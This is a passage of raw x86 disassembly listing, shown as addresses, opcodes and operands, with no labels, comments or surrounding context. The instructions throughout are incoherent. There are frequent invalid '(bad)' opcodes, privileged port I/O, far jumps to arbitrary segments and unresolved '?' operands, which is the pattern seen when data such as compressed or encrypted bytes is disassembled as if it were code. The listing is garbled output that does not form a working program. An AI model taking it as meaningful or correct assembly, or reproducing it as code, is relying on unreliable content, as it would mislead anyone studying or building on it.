  418b26:	push   eax
  418b27:	push   ss
  418b28:	xchg   esi,eax
  418b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2a:	cmc    
  418b2b:	out    dx,al
  418b2c:	pop    ecx
  418b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b2e:	outs   dx,BYTE PTR ds:[esi]
  418b2f:	or     esp,DWORD PTR [edx+ebp*2]
  418b32:	imul   ebp,DWORD PTR ds:0xddb5c61d,0xf576175d
  418b3c:	js     0x418ada
  418b3e:	mov    ch,0xd1
  418b40:	lods   al,BYTE PTR ds:[esi]
  418b41:	pusha  
  418b42:	loopne 0x418afb
  418b44:	jle    0x418bb6
  418b46:	dec    eax
  418b47:	(bad)
  418b4b:	fdivr  DWORD PTR ds:0xf85bb611
  418b51:	adc    ebx,DWORD PTR [ecx+edi*4+0x5a]
  418b55:	and    ecx,DWORD PTR [edi]
  418b57:	cmc    
  418b58:	inc    edx
  418b59:	xchg   ecx,eax
  418b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b5b:	mov    dh,0x21
  418b5d:	jbe    0x418bc7
  418b5f:	mov    ch,0x2c
  418b61:	popf   
  418b62:	add    DWORD PTR [ecx+0x5b],esi
  418b65:	retf   
  418b66:	dec    edi
  418b67:	popf   
  418b68:	jne    0x418afc
  418b6a:	inc    ebp
  418b6b:	adc    al,0x31
  418b6d:	sub    esp,DWORD PTR [si-0x6e]
  418b71:	enter  0xcd84,0x2
  418b75:	adc    cl,BYTE PTR [eax-0x6c489515]
  418b7b:	cmp    ah,BYTE PTR [edi]
  418b7d:	adc    edx,ebp
  418b7f:	in     al,dx
  418b80:	adc    BYTE PTR [eax],bl
  418b82:	(bad)  
  418b83:	xor    dh,ch
  418b85:	mov    ds:0x52a27b52,al
  418b8a:	push   es
  418b8b:	mov    ecx,0x5e47dd2b
  418b90:	mov    al,bl
  418b92:	mov    bh,0x50
  418b94:	push   ebx
  418b95:	fbld   TBYTE PTR [ecx]
  418b97:	cld    
  418b98:	inc    edx
  418b99:	pop    ss
  418b9a:	fcmovu st,st(0)
  418b9c:	out    dx,eax
  418b9d:	iret   
  418b9e:	outs   dx,DWORD PTR ds:[esi]
  418b9f:	arpl   WORD PTR [ebp-0x395f4b7],cx
  418ba5:	xlat   BYTE PTR ds:[ebx]
  418ba6:	pop    ds
  418ba7:	ficomp DWORD PTR [ecx+0xf8c253e]
  418bad:	xchg   esp,eax
  418bae:	fimul  WORD PTR [edx+0x512e1b25]
  418bb4:	push   ds
  418bb5:	jmp    0x418b52
  418bb7:	call   0xfa8d4f7f
  418bbc:	std    
  418bbd:	sbb    BYTE PTR [eax],bh
  418bbf:	pop    esi
  418bc0:	jl     0x418b98
  418bc2:	and    esi,DWORD PTR [ebp+0x4d941963]
  418bc8:	sar    BYTE PTR [ebx-0x7e],1
  418bcb:	xor    esi,edi
  418bcd:	(bad)  
  418bce:	xchg   BYTE PTR [esi+eiz*4-0x5],bh
  418bd2:	arpl   WORD PTR ss:[edx+0x100443ed],ax
  418bd9:	in     eax,dx
  418bda:	repnz mov bh,BYTE PTR [edi]
  418bdd:	add    BYTE PTR [ebx-0xaa15e1a],al
  418be3:	lods   al,BYTE PTR ds:[esi]
  418be4:	out    dx,eax
  418be5:	mov    cl,0x3a
  418be7:	or     edx,esi
  418be9:	mov    ebp,0xb210e31c
  418bee:	sbb    al,0xd6
  418bf0:	jecxz  0x418c6a
  418bf2:	jne    0x418bf2
  418bf4:	pop    esi
  418bf5:	push   ds
  418bf6:	aaa    
  418bf7:	push   es
  418bf8:	mov    BYTE PTR [ebp-0x2e685da2],dh
  418bfe:	mov    ds:0x5b8999a4,eax
  418c03:	addr16 pop ebp
  418c05:	int    0x11
  418c07:	sar    BYTE PTR [ecx-0x69b9c65a],0x61
  418c0e:	xor    esp,DWORD PTR [edx+edx*1+0x55]
  418c12:	jae    0x418bee
  418c14:	icebp  
  418c15:	call   0x6e3e60de
  418c1a:	pushw  ss
  418c1c:	mov    al,0x45
  418c1e:	xchg   ebp,eax
  418c1f:	pusha  
  418c20:	or     DWORD PTR [esi],edi
  418c22:	add    DWORD PTR [edi],esi
  418c24:	sbb    al,0xe0
  418c26:	sar    bl,0x18
  418c29:	add    bh,0x54
  418c2c:	adc    al,0x9
  418c2e:	aad    0x90
  418c30:	mov    ds,WORD PTR [ecx]
  418c32:	ins    DWORD PTR es:[edi],dx
  418c33:	or     BYTE PTR gs:[esi+0x23],dl
  418c37:	retf   
  418c38:	in     eax,0x59
  418c3a:	clc    
  418c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c3c:	out    0x81,eax
  418c3e:	mov    ebp,0x7c32b9b
  418c43:	imul   ecx,DWORD PTR [esi],0x31
  418c46:	mov    esi,0x678355ee
  418c4b:	add    DWORD PTR [eax+0xb],ebp
  418c4e:	std    
  418c4f:	stos   BYTE PTR es:[edi],al
  418c50:	ins    DWORD PTR es:[edi],dx
  418c51:	sbb    edx,0x2a45651f
  418c57:	cmp    esp,DWORD PTR [ecx]
  418c59:	in     eax,dx
  418c5a:	push   edi
  418c5b:	and    al,BYTE PTR [ebx-0x23]
  418c5e:	push   eax
  418c5f:	mov    edx,0x1b0ff048
  418c64:	pop    ebp
  418c65:	stos   BYTE PTR es:[edi],al
  418c66:	jno    0x418ca5
  418c68:	dec    esi
  418c69:	popf   
  418c6a:	mov    DWORD PTR [edi+ebp*1-0x1c],esp
  418c6e:	outs   dx,DWORD PTR ds:[esi]
  418c6f:	fs cld 
  418c71:	inc    esi
  418c72:	sbb    al,0x34
  418c74:	imul   edi,DWORD PTR [ebx+0x3e],0x372fece2
  418c7b:	nop
  418c7c:	jo     0x418c0a
  418c7e:	mov    ds,WORD PTR [esi+edi*1-0x57]
  418c82:	sub    eax,DWORD PTR [esi]
  418c84:	mov    ah,0x60
  418c86:	mov    ebx,0x9a7ed966
  418c8b:	xor    DWORD PTR [esi+ebx*4-0x31efa5e1],ebx
  418c92:	mov    ebp,0x661da819
  418c97:	dec    edi
  418c98:	adc    BYTE PTR [ebx],0x8c
  418c9b:	es cmp eax,0x2872715e
  418ca1:	push   0xffffffb7
  418ca3:	int3   
  418ca4:	mov    ebx,0xd2cf0f83
  418ca9:	push   0xffffffca
  418cab:	cdq    
  418cac:	test   eax,0x8a05e688
  418cb1:	inc    ebp
  418cb2:	sub    bh,BYTE PTR [edx]
  418cb4:	cmp    BYTE PTR [edi-0x1a],0x8e
  418cb8:	neg    ebx
  418cba:	mov    WORD PTR [edx],ss
  418cbc:	js     0x418d2d
  418cbe:	lahf   
  418cbf:	mov    ah,0xc1
  418cc1:	scas   eax,DWORD PTR es:[edi]
  418cc2:	mov    cl,0xb
  418cc4:	repz cmp edi,esp
  418cc7:	sti    
  418cc8:	lds    esi,FWORD PTR [ebx+0x21]
  418ccb:	rcr    DWORD PTR [eax],1
  418ccd:	lea    ebx,[eax-0x5e4b2959]
  418cd3:	xor    BYTE PTR ds:0x47c204d4,dl
  418cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cda:	(bad)  
  418cdb:	(bad)  
  418cdc:	mov    edx,DWORD PTR [ecx+0x16c2ed0]
  418ce2:	cmp    BYTE PTR [eax],cl
  418ce4:	mov    bl,0xbe
  418ce6:	inc    edi
  418ce7:	mov    ch,0x19
  418ce9:	stos   DWORD PTR es:[edi],eax
  418cea:	pop    eax
  418ceb:	into   
  418cec:	add    eax,0x25956b58
  418cf1:	stc    
  418cf2:	leave  
  418cf3:	adc    cl,dh
  418cf5:	adc    al,0x49
  418cf7:	adc    al,0xbd
  418cf9:	push   ebp
  418cfa:	cmp    eax,DWORD PTR [ecx+0x2e3bfbc4]
  418d00:	sub    al,ah
  418d02:	mov    ebx,0x6704a1f9
  418d07:	and    al,0x24
  418d09:	test   eax,0xeb208df8
  418d0e:	es sub eax,0xc64195aa
  418d14:	xor    al,0xfe
  418d16:	lods   eax,DWORD PTR ds:[esi]
  418d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d18:	nop
  418d19:	out    dx,al
  418d1a:	mov    WORD PTR [ecx+0x7cbc4770],cs
  418d20:	dec    esp
  418d21:	sbb    al,0x4b
  418d23:	in     al,dx
  418d24:	inc    esi
  418d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d26:	enter  0xa3f1,0xad
  418d2a:	lods   al,BYTE PTR ds:[esi]
  418d2b:	mov    bl,bl
  418d2d:	repz xchg ecx,eax
  418d2f:	cmc    
  418d30:	adc    dl,BYTE PTR [ebp+0x5105df74]
  418d36:	or     ah,al
  418d38:	lods   al,BYTE PTR ds:[esi]
  418d39:	push   ss
  418d3a:	dec    esp
  418d3b:	(bad)  
  418d3c:	jns    0x418d67
  418d3e:	push   ebp
  418d3f:	dec    eax
  418d40:	sbb    dl,BYTE PTR [ecx]
  418d42:	scas   eax,DWORD PTR es:[edi]
  418d43:	mov    esi,0x4c97a727
  418d48:	fs ja  0x418cec
  418d4b:	jmp    0x418d06
  418d4d:	add    ah,ah
  418d4f:	adc    edi,DWORD PTR [edi-0x22]
  418d52:	lock imul esi,DWORD PTR [edx+0x2088e45b],0x3f0f6f02
  418d5d:	std    
  418d5e:	dec    edx
  418d5f:	fistp  WORD PTR [edx-0xb]
  418d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d63:	je     0x418d2a
  418d65:	sub    edi,0x6f
  418d68:	fwait
  418d69:	lods   eax,DWORD PTR ds:[esi]
  418d6a:	mov    eax,ds:0x9f788f12
  418d6f:	sub    bl,ah
  418d71:	mov    eax,ds:0x15ed2b3
  418d76:	pop    es
  418d77:	cwde   
  418d78:	inc    ebp
  418d79:	(bad)  
  418d7a:	adc    BYTE PTR [esi-0x57607498],bl
  418d80:	fisttp DWORD PTR [edi+0x3d]
  418d83:	cmp    eax,DWORD PTR [ecx]
  418d85:	nop
  418d86:	dec    esp
  418d87:	lock inc esi
  418d89:	arpl   ax,di
  418d8b:	mov    ebx,0x185607c3
  418d90:	jns    0x418dc4
  418d92:	lahf   
  418d93:	fidiv  WORD PTR [edi]
  418d95:	popa   
  418d96:	loop   0x418dff
  418d98:	fidiv  DWORD PTR [ecx-0x396d1d64]
  418d9e:	sbb    ah,ah
  418da0:	pop    eax
  418da1:	cld    
  418da2:	jmp    0x418dba
  418da4:	add    bl,BYTE PTR [eax]
  418da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da7:	pop    ebp
  418da8:	ds loope 0x418e0c
  418dab:	sbb    dh,ah
  418dad:	xor    eax,0xdaad2f78
  418db2:	dec    edx
  418db3:	or     DWORD PTR [ebx],esp
  418db5:	mov    cl,0x96
  418db7:	jmp    0xe0da:0x31d5fb6c
  418dbe:	mov    ah,0xcf
  418dc0:	jge    0x418dcb
  418dc2:	xchg   edi,eax
  418dc3:	addr16 xor al,0x78
  418dc6:	dec    edx
  418dc7:	dec    ebp
  418dc8:	rcr    BYTE PTR [eax+0x5f3668a2],1
  418dce:	ins    DWORD PTR es:[edi],dx
  418dcf:	(bad)  
  418dd0:	mov    edx,0x61a159d1
  418dd5:	cld    
  418dd6:	jle    0x418d97
  418dd8:	jae    0x418da4
  418dda:	test   al,0x79
  418ddc:	loope  0x418da2
  418dde:	sbb    eax,0xfcfd307
  418de3:	popa   
  418de4:	ss mov ah,0xbb
  418de7:	dec    edx
  418de8:	push   edi
  418de9:	push   esp
  418dea:	aas    
  418deb:	inc    DWORD PTR [ebx]
  418ded:	clc    
  418dee:	ror    BYTE PTR [eax-0x13],cl
  418df1:	loopne 0x418d95
  418df3:	xchg   DWORD PTR [eax],esp
  418df5:	sbb    edi,eax
  418df7:	jmp    0x418e6e
  418df9:	or     eax,DWORD PTR [esi-0x43]
  418dfc:	repnz icebp 
  418dfe:	add    BYTE PTR [edx-0x3c],0xda
  418e02:	inc    ah
  418e04:	fwait
  418e05:	pop    es
  418e06:	mov    edi,0xf453c5a7
  418e0b:	mov    esp,0x8cc8ab41
  418e10:	ds sbb eax,ebx
  418e13:	int3   
  418e14:	out    dx,al
  418e15:	jne    0x418dfc
  418e17:	adc    ah,ch
  418e19:	xchg   ecx,eax
  418e1a:	mov    esi,0x1325a99c
  418e1f:	stos   BYTE PTR es:[edi],al
  418e20:	test   eax,0xcac83e4
  418e25:	sti    
  418e26:	pushf  
  418e27:	xor    edi,DWORD PTR [eax-0x50502b2c]
  418e2d:	sub    eax,0x709d14a
  418e32:	fld    TBYTE PTR [esi+edi*8-0x56302e76]
  418e39:	out    0xdd,al
  418e3b:	lds    ecx,FWORD PTR [si-0x1785]
  418e40:	mov    ch,0x44
  418e42:	sahf   
  418e43:	inc    eax
  418e44:	adc    al,dh
  418e46:	jge    0x418e88
  418e48:	mov    ebx,0x7e8587c4
  418e4d:	cs stos DWORD PTR es:[edi],eax
  418e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e50:	xchg   BYTE PTR [esi],dl
  418e52:	xchg   edx,eax
  418e53:	(bad)  
  418e55:	out    0xe3,al
  418e57:	adc    DWORD PTR ds:0xe717b6fd,esi
  418e5d:	sub    eax,0x23fba34d
  418e62:	xor    BYTE PTR [edx+0x49],0xfc
  418e66:	jmp    0x9a308205
  418e6b:	inc    ebx
  418e6c:	and    eax,0xe5e1145c
  418e71:	mov    bl,0x70
  418e73:	test   eax,0xc1eca5ad
  418e78:	mov    ebx,0x5394b6a8
  418e7d:	(bad)  
  418e7e:	and    BYTE PTR [edx-0x26],dl
  418e81:	push   ecx
  418e82:	(bad)  
  418e84:	mov    ds:0xb5678e9d,eax
  418e89:	test   cl,0xe5
  418e8c:	(bad)  
  418e8d:	je     0x418e31
  418e8f:	shl    DWORD PTR [eax+0x14],1
  418e92:	jmp    FWORD PTR [ecx+esi*8-0xa3f02c4]
  418e99:	pop    edi
  418e9a:	jmp    FWORD PTR [esi+ebp*1]
  418e9d:	push   0x45
  418e9f:	cld    
  418ea0:	(bad)  
  418ea1:	cmp    DWORD PTR [ebp-0x3c],esi
  418ea4:	sbb    BYTE PTR ds:0xac850169,ch
  418eaa:	pop    ebx
  418eab:	xor    ah,BYTE PTR [edx+eax*1+0x302dd76d]
  418eb2:	adc    esp,DWORD PTR [esi-0x2a]
  418eb5:	fcmovbe st,st(3)
  418eb7:	test   eax,0x6bd9f6ef
  418ebc:	inc    ebp
  418ebd:	mov    ah,bl
  418ebf:	mov    ecx,0xea316dff
  418ec4:	jno    0x418e77
  418ec6:	into   
  418ec7:	ja     0x418ed4
  418ec9:	test   DWORD PTR [eax+0x7f],esi
  418ecc:	outs   dx,DWORD PTR ds:[esi]
  418ecd:	add    edi,DWORD PTR [ecx+0x3]
  418ed0:	pop    ebx
  418ed1:	ss inc edx
  418ed3:	cs jae 0x418f07
  418ed6:	xchg   edx,eax
  418ed7:	imul   edx,esi,0xf521e788
  418edd:	xor    DWORD PTR [ebx+0x13fce24c],edx
  418ee3:	or     BYTE PTR [ecx-0x38],bl
  418ee6:	fs cmp eax,0xf151578c
  418eec:	loop   0x418eed
  418eee:	jb     0x418f4d
  418ef0:	int    0x61
  418ef2:	mov    WORD PTR [eax-0x46d53f48],ds
  418ef8:	sbb    eax,DWORD PTR [esi]
  418efa:	add    eax,0x77cbc4d1
  418eff:	clc    
  418f00:	out    dx,al
  418f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f02:	mov    edx,0xba27a94d
  418f07:	mov    ebx,0xa439e0a0
  418f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f0d:	xlat   BYTE PTR ds:[ebx]
  418f0e:	mov    al,0x54
  418f10:	into   
  418f11:	add    al,BYTE PTR [ebx-0x2d]
  418f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f15:	xchg   ebx,eax
  418f16:	mov    eax,0x7b313fff
  418f1b:	inc    ebx
  418f1c:	daa    
  418f1d:	int3   
  418f1e:	ror    edx,0xe9
  418f21:	dec    ecx
  418f22:	in     al,dx
  418f23:	push   ebp
  418f24:	mov    ah,BYTE PTR [esi]
  418f26:	push   0xe0c4311a
  418f2b:	and    al,0x21
  418f2d:	mov    ds:0xeba53180,eax
  418f32:	mov    esp,0xd495c339
  418f37:	cmp    edx,esi
  418f39:	clc    
  418f3a:	sbb    bh,bl
  418f3c:	daa    
  418f3d:	pop    edi
  418f3e:	fnstcw WORD PTR [ecx+0x32]
  418f41:	fucomip st,st(6)
  418f43:	adc    DWORD PTR [ebx],ebx
  418f45:	push   edi
  418f46:	ret    0x558a
  418f49:	mov    bl,0xfa
  418f4b:	sub    DWORD PTR [eax+0x37bd53d2],esi
  418f51:	imul   ebx,DWORD PTR [ebx-0x437b1437],0x9d2b4e31
  418f5b:	lds    ecx,FWORD PTR [edx]
  418f5d:	(bad)  
  418f5f:	push   cs
  418f60:	test   DWORD PTR [edi-0xb],ecx
  418f63:	shl    DWORD PTR [edi+0x41],cl
  418f66:	mov    ebx,0xa7142dc2
  418f6b:	fistp  QWORD PTR [si+0x50]
  418f6f:	adc    esi,eax
  418f71:	adc    BYTE PTR [edi],dh
  418f73:	retf   
  418f74:	addr16 fwait
  418f76:	neg    DWORD PTR [edi-0x2a7e2798]
  418f7c:	push   esp
  418f7d:	or     DWORD PTR [ecx+0x13bbd1ad],edi
  418f83:	outs   dx,DWORD PTR ds:[esi]
  418f84:	or     al,0xfc
  418f86:	jmp    0x2317ed52
  418f8b:	add    ecx,DWORD PTR [edi]
  418f8d:	jbe    0x418fc8
  418f8f:	pop    edx
  418f90:	mov    bh,0x1
  418f92:	ja     0x418f7d
  418f94:	(bad)  
  418f96:	dec    edx
  418f97:	ret    
  418f98:	cmp    eax,DWORD PTR [eax-0x57]
  418f9b:	xchg   esp,eax
  418f9c:	adc    ebp,edi
  418f9e:	popf   
  418f9f:	or     edi,DWORD PTR [ebp+0xb]
  418fa2:	mov    ?,edx
  418fa4:	pusha  
  418fa5:	mov    bh,0x70
  418fa7:	imul   ebp,DWORD PTR [esi],0x30
  418faa:	daa    
  418fab:	jbe    0x418f46
  418fad:	inc    edx
  418fae:	mov    ss,WORD PTR [edi]
  418fb0:	push   edi
  418fb1:	out    0xd0,eax
  418fb3:	int    0x3c
  418fb5:	mov    bl,0xe5
  418fb7:	retf   0xaecc
  418fba:	sub    DWORD PTR [esi-0x5d63a326],ecx
  418fc0:	test   eax,0xa34ba79c
  418fc5:	lock adc bh,BYTE PTR ds:0x56b91963
  418fcc:	dec    edx
  418fcd:	inc    esi
  418fce:	into   
  418fcf:	mov    ebx,0xef0b7336
  418fd4:	hlt    
  418fd5:	jo     0x418ff3
  418fd7:	in     al,dx
  418fd8:	mov    eax,ds:0xfbf4524b
  418fdd:	sub    DWORD PTR [ebx-0xd],ecx
  418fe0:	je     0x419018
  418fe2:	inc    eax
  418fe3:	arpl   WORD PTR [edi-0x25],si
  418fe6:	and    BYTE PTR cs:[esi+0x5b],0xfe
  418feb:	mov    DWORD PTR [esi+0x61],ebp
  418fee:	mov    ds:0x7ae704b4,al
  418ff3:	pop    edi
  418ff4:	dec    ebp
  418ff5:	data16 cmc 
  418ff7:	cmp    ah,BYTE PTR [eax+ebp*4-0x3a]
  418ffb:	jbe    0x418fa2
  418ffd:	jnp    0x418f98
  418fff:	(bad)  ds:0x7f09cb14
  419005:	scas   eax,DWORD PTR es:[edi]
  419006:	fwait
  419007:	aam    0xe1
  419009:	inc    esi
  41900a:	or     al,0x92
  41900c:	rcl    BYTE PTR [edx+0x36],cl
  41900f:	sub    al,0x61
  419011:	scas   eax,DWORD PTR es:[edi]
  419012:	dec    edi
  419013:	pop    edi
  419014:	in     eax,dx
  419015:	dec    edx
  419016:	mov    ch,0x3d
  419018:	cli    
  419019:	lds    esi,FWORD PTR [edi-0x53]
  41901c:	daa    
  41901d:	xor    DWORD PTR [esi-0x5d4fd848],0x3d
  419024:	xchg   ecx,eax
  419025:	dec    ebp
  419026:	sbb    al,0x17
  419028:	std    
  419029:	cmp    al,0xf9
  41902b:	es retf 
  41902d:	jp     0x418fc9
  41902f:	aas    
  419030:	jp     0x419072
  419032:	dec    edi
  419033:	fmul   DWORD PTR [ebp+0x49]
  419036:	std    
  419037:	or     DWORD PTR [ebx+0x70],0xb7ca4592
  41903e:	dec    ebp
  41903f:	into   
  419040:	arpl   WORD PTR [esi],di
  419042:	lods   al,BYTE PTR ds:[esi]
  419043:	jne    0x41909a
  419045:	mov    dl,0xe1
  419047:	xor    DWORD PTR [ebp+0x2dd14fa8],esp
  41904d:	out    0x6e,al
  41904f:	cmc    
  419050:	call   0x85cd24da
  419055:	out    dx,eax
  419056:	cmp    al,0x76
  419058:	jne    0x419054
  41905a:	push   edx
  41905b:	add    ah,ch
  41905d:	pop    ebx
  41905e:	xchg   edx,eax
  41905f:	adc    eax,0xcbad1bc0
  419064:	pop    ss
  419065:	stc    
  419066:	inc    esi
  419067:	xor    eax,0x5fbbadf4
  41906c:	loop   0x41903e
  41906e:	push   0x34
  419070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419071:	stos   BYTE PTR es:[edi],al
  419072:	loopne 0x4190a9
  419074:	int3   
  419075:	je     0x418ffa
  419077:	add    ebx,ebp
  419079:	pop    eax
  41907a:	ja     0x419075
  41907c:	adc    al,BYTE PTR [ebx+0x789fb847]
  419082:	cdq    
  419083:	cmp    bl,dh
  419085:	mov    eax,0x5cee1095
  41908a:	(bad)  
  41908c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41908d:	cdq    
  41908e:	rcl    ch,0x28
  419091:	cld    
  419092:	pop    ss
  419093:	imul   esp,DWORD PTR [ebp-0x53702a2c],0x13efb38d
  41909d:	push   es
  41909e:	pop    esi
  41909f:	test   al,0x71
  4190a1:	mov    ch,0x75
  4190a3:	push   ebp
  4190a4:	xor    DWORD PTR [ecx+0x18],0x14
  4190a8:	lea    esp,[ebp+0x2faeb5b6]
  4190ae:	jne    0x419078
  4190b0:	push   0xffffff9e
  4190b2:	pop    ds
  4190b3:	add    al,BYTE PTR [edx]
  4190b5:	popf   
  4190b6:	push   es
  4190b7:	fnstenv ds:0xc901c81e
  4190bd:	push   eax
  4190be:	inc    ebx
  4190bf:	mov    al,0x1f
  4190c1:	cmc    
  4190c2:	cli    
  4190c3:	pmaddwd mm0,QWORD PTR [ecx]
  4190c6:	adc    eax,0x96e5e3e8
  4190cb:	add    BYTE PTR [ebp+0x5c],0xeb
  4190cf:	cmp    BYTE PTR [edx+eax*4],al
  4190d2:	inc    eax
  4190d3:	es pop esp
  4190d5:	imul   eax,DWORD PTR [ebx+ecx*2-0x4bd4f10f],0xd5d26fbd
  4190e0:	jmp    0xa239472
  4190e5:	mov    ebx,0x11e4bc52
  4190ea:	dec    edi
  4190eb:	mov    ds:0xd006778f,al
  4190f0:	mov    ah,0xb1
  4190f2:	in     eax,dx
  4190f3:	adc    BYTE PTR [ecx-0x7820f844],dh
  4190f9:	inc    ecx
  4190fa:	push   edx
  4190fb:	mov    ebp,0x89d07277
  419100:	lock jbe 0x419128
  419103:	xchg   edx,eax
  419104:	mov    dl,0xca
  419106:	cmp    BYTE PTR cs:[edx+0x498650df],ch
  41910d:	add    dh,bh
  41910f:	pop    es
  419110:	sar    DWORD PTR [eax],0xf3
  419113:	jns    0x41916e
  419115:	out    dx,eax
  419116:	push   ss
  419117:	rcl    BYTE PTR [ecx+0x46717a5c],0xc8
  41911e:	call   ecx
  419120:	icebp  
  419121:	hlt    
  419122:	jmp    0x419188
  419124:	add    bh,BYTE PTR [ebx]
  419126:	aaa    
  419127:	pushf  
  419128:	push   esp
  419129:	rcl    DWORD PTR [eax+0x438f8371],1
  41912f:	fwait
  419130:	imul   ecx,DWORD PTR [ebx+0x75],0xc4e8ff6a
  419137:	cld    
  419138:	fwait
  419139:	inc    esp
  41913a:	and    DWORD PTR [eax-0x7d],ecx
  41913d:	push   ss
  41913e:	test   BYTE PTR [eax],bh
  419140:	fwait
  419141:	xor    eax,0xe0f94d37
  419146:	pop    edi
  419147:	jp     0x419133
  419149:	xchg   ecx,eax
  41914a:	inc    ebp
  41914b:	add    ebp,ebp
  41914d:	shr    DWORD PTR [esi-0x1c],0xdb
  419151:	inc    esi
  419152:	leave  
  419153:	outs   dx,BYTE PTR ds:[esi]
  419154:	out    dx,al
  419155:	mov    edx,DWORD PTR [ebx]
  419157:	shl    esp,cl
  419159:	pop    ds
  41915a:	data16 cmp al,0xce
  41915d:	data16 lock mov bl,0x5f
  419161:	gs js  0x419165
  419164:	jmp    0x419107
  419166:	and    DWORD PTR [edx],esp
  419168:	cdq    
  419169:	leave  
  41916a:	(bad)  
  41916b:	pcmpeqd mm5,QWORD PTR [edi+0x16511bb]
  419172:	fs sub al,0xd6
  419175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419176:	push   eax
  419177:	rol    ebp,0xc7
  41917a:	stos   BYTE PTR es:[edi],al
  41917b:	test   eax,0xef692a8e
  419180:	push   edi
  419181:	pop    edi
  419182:	adc    al,0xe0
  419184:	and    DWORD PTR ds:0x5b566acb,esp
  41918a:	test   DWORD PTR [ecx+0x5c],ebx
  41918d:	lods   al,BYTE PTR ds:[esi]
  41918e:	xchg   ecx,eax
  41918f:	pop    ds
  419190:	fadd   st(0),st
  419192:	icebp  
  419193:	aam    0x1e
  419195:	jle    0x4191f1
  419197:	mov    edx,0xd3a67cd2
  41919c:	xchg   edi,eax
  41919d:	mov    ds:0xd02cfc68,al
  4191a2:	xor    al,0xfd
  4191a4:	nop
  4191a5:	in     eax,dx
  4191a6:	push   edx
  4191a7:	push   ebx
  4191a8:	pushf  
  4191a9:	xchg   DWORD PTR [edx+esi*4],esi
  4191ac:	mov    al,ds:0xc1271c1c
  4191b1:	mov    WORD PTR [esi-0x1e],fs
  4191b4:	(bad)  
  4191b5:	mov    ds:0x6f56b2a9,eax
  4191ba:	sbb    al,0xb9
  4191bc:	dec    BYTE PTR [edi-0x2fbed649]
  4191c2:	cli    
  4191c3:	mov    ebp,0xb0cfb33f
  4191c8:	call   0xec04:0xb5f38aa
  4191cf:	xor    al,0xa2
  4191d1:	jmp    0x31e5:0x3ddf7597
  4191d8:	mov    ?,WORD PTR cs:[ecx]
  4191db:	(bad)  
  4191dc:	leave  
  4191dd:	xchg   BYTE PTR [ecx+eax*2+0x12],bl
  4191e1:	mov    eax,0x8bb5e80c
  4191e6:	mov    ds:0x8e4f9b81,eax
  4191eb:	shr    dl,1
  4191ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ee:	retf   0xefb8
  4191f1:	lds    ecx,FWORD PTR [esi]
  4191f3:	sbb    BYTE PTR [edi-0x2c],al
  4191f6:	pushf  
  4191f7:	out    dx,eax
  4191f8:	ds js  0x4191f8
  4191fb:	mov    al,ds:0x8bb1f34f
  419200:	inc    ebx
  419201:	cwde   
  419202:	and    esi,DWORD PTR [ecx+0x4e6874e1]
  419208:	rcr    BYTE PTR [edx+0xf8d8cc2],0xcf
  41920f:	jecxz  0x41925a
  419211:	inc    esi
  419212:	or     eax,0x325042e7
  419217:	adc    bl,dh
  419219:	shr    DWORD PTR [ecx-0x37],1
  41921c:	pop    edx
  41921d:	mov    WORD PTR [ecx+0x5c],gs
  419220:	jnp    0x4191b6
  419222:	adc    eax,0x839d0ee
  419227:	sub    al,0x44
  419229:	dec    ecx
  41922a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41922b:	je     0x419229
  41922d:	or     BYTE PTR [edi+0x6501a765],dh
  419233:	fmul   st(2),st
  419235:	xchg   DWORD PTR [edi+0x75f1282a],eax
  41923b:	mov    ds:0xd06436b2,eax
  419240:	dec    edx
  419241:	fnstsw WORD PTR [edx+0x28]
  419244:	mov    bl,0x1f
  419246:	nop    DWORD PTR [ebx-0x5f]
  41924a:	js     0x4192b1
  41924c:	jge    0x419273
  41924e:	mov    ebp,0x5226ec3f
  419253:	add    ebx,DWORD PTR [eax]
  419255:	push   0xffffffaf
  419257:	xchg   edx,ebp
  419259:	push   eax
  41925a:	jmp    0xf8a384fb
  41925f:	jbe    0x41925b
  419261:	or     ah,ah
  419263:	pop    es
  419264:	outs   dx,BYTE PTR ds:[esi]
  419265:	lahf   
  419266:	ss push ss
  419268:	mov    al,ds:0x9eb000c3
  41926d:	jo     0x4192ed
  41926f:	cmc    
  419270:	cld    
  419271:	and    al,0xf5
  419273:	daa    
  419274:	sahf   
  419275:	xlat   BYTE PTR ds:[ebx]
  419276:	cmp    al,BYTE PTR [edi-0xb734a86]
  41927c:	push   0x5
  41927e:	sar    BYTE PTR [edi-0x15],0xd6
  419282:	fisttp WORD PTR [edi]
  419284:	repz sbb edi,DWORD PTR [eax]
  419287:	dec    eax
  419288:	retf   0x48b4
  41928b:	jbe    0x419301
  41928d:	mov    esi,0xaf2a19d8
  419292:	adc    eax,DWORD PTR [edx+edx*1-0x25]
  419296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419297:	cmp    BYTE PTR [ecx+eiz*2+0xe3f7e65],0x51
  41929f:	jle    0x419292
  4192a1:	jmp    0x419289
  4192a3:	or     BYTE PTR [ecx+0x27],bh
  4192a6:	xor    al,0x6
  4192a8:	scas   al,BYTE PTR es:[edi]
  4192a9:	test   eax,0xa401cdb4
  4192ae:	push   ebx
  4192af:	sti    
  4192b0:	stc    
  4192b1:	jmp    0x2afcc7f2
  4192b6:	icebp  
  4192b7:	pop    ebx
  4192b8:	sbb    ch,bh
  4192ba:	jmp    0x4192a6
  4192bc:	jmp    0x41929e
  4192be:	arpl   di,ax
  4192c0:	in     eax,dx
